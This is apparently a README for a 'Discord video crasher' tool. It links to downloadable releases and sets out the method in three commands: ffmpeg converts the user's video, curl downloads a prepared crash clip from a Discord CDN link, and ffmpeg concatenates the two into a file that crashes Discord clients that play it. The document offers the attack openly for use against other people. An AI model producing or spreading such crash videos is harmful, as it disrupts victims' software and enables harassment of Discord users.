## Discord Video Crasher

You can download the discord video crasher [here.](https://github.com/VapeLiminator/VideoCrasher/releases)



### How does it work?

It really just works very simply:

//I'm going to ignore the specifying path's and othere stuff from here

# ffmpeg -i %videoname%.mp4 "01110101-01110101-01101000-01101000-01101000.mp4" 
# curl -ko "abc.mp4" "https://cdn.discordapp.com/attachments/965003761485492314/987416285216387142/FemaleAnimatedHyrax-mobile.mp4"
# ffmpeg -f concat -i uwu.txt -codec copy %crashername%.mp4

//And that's the important part! the only thing left is removing the files we've created, and it's done.
